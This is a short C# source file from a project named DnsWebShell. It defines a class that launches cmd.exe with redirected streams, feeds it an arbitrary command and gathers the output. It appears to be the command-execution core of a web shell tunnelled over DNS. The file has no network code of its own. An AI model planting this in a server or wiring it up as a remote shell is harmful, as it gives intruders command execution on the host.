using System.Diagnostics;

namespace DnsWebShell;

public class CmdProcess
{
	public string? Output => _output;
	public string? Error => _error;

	private string? _output;
	private string? _error;

	private ProcessStartInfo _processInfo = new ProcessStartInfo();
	private Process _process = new Process();

	public async Task ExecuteCommand(string command)
	{
		_process.Dispose();
		SetNewProcess();

		await _process.StandardInput.WriteLineAsync(command);
	}

	private void SetNewProcess()
	{
		_output = "";
		_error = "";

		_processInfo.FileName = "cmd.exe";
		_processInfo.UseShellExecute = false;
		_processInfo.RedirectStandardInput = true;
		_processInfo.RedirectStandardOutput = true;
		_processInfo.RedirectStandardError = true;

		_process = new Process();

		_process.OutputDataReceived += new DataReceivedEventHandler((object sender, DataReceivedEventArgs e) =>
		{
			_output += e.Data + "\n";
		});

		_process.ErrorDataReceived += new DataReceivedEventHandler((object sender, DataReceivedEventArgs e) =>
		{
			_output += e.Data + "\n";
		});

		_process.StartInfo = _processInfo;
		_process.Start();
		_process.BeginOutputReadLine();
		_process.BeginErrorReadLine();

	}
}
